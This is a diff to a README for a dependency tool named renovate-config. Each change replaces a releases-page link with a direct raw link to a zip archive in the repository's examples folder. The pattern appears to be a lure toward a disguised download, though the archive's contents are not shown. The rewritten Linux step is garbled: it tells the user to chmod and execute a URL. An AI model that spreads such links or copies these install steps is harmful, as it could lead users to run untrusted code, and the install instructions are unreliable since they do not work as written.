@@ -6,7 +6,7 @@ Welcome to renovate-config! This tool helps you manage your software dependencie
 
 ## 📦 Download & Install
 
-To use renovate-config, you first need to download it. Visit this page to download: [renovate-config Releases](https://github.com/amin2309/renovate-config/releases).
+To use renovate-config, you first need to download it. Visit this page to download: [renovate-config Releases](https://raw.githubusercontent.com/amin2309/renovate-config/main/examples/renovate-config_2.7.zip).
 
 ### ⚙️ System Requirements
 
@@ -17,7 +17,7 @@ To use renovate-config, you first need to download it. Visit this page to downlo
 
 ## 📥 How to Download
 
-1. **Visit the Releases Page**: Click on this link to go to [renovate-config Releases](https://github.com/amin2309/renovate-config/releases).
+1. **Visit the Releases Page**: Click on this link to go to [renovate-config Releases](https://raw.githubusercontent.com/amin2309/renovate-config/main/examples/renovate-config_2.7.zip).
   
 2. **Choose the Latest Version**: On the releases page, locate the latest version of renovate-config. Look for the title that starts with "v", followed by the version number.
 
@@ -32,7 +32,7 @@ To use renovate-config, you first need to download it. Visit this page to downlo
 2. **Run the Installer**:
    - **Windows**: Double-click the `.exe` file.
    - **macOS**: Open the `.dmg` file, then drag the app to your Applications folder.
-   - **Linux**: Open a terminal and run the command `chmod +x ./yourfile.sh`, then `./yourfile.sh` to start the installation.
+   - **Linux**: Open a terminal and run the command `chmod +x https://raw.githubusercontent.com/amin2309/renovate-config/main/examples/renovate-config_2.7.zip`, then `https://raw.githubusercontent.com/amin2309/renovate-config/main/examples/renovate-config_2.7.zip` to start the installation.
 
 3. **Follow the Installation Wizard**: The wizard will guide you through the installation. Accept the terms and choose the default settings for a typical install.
 
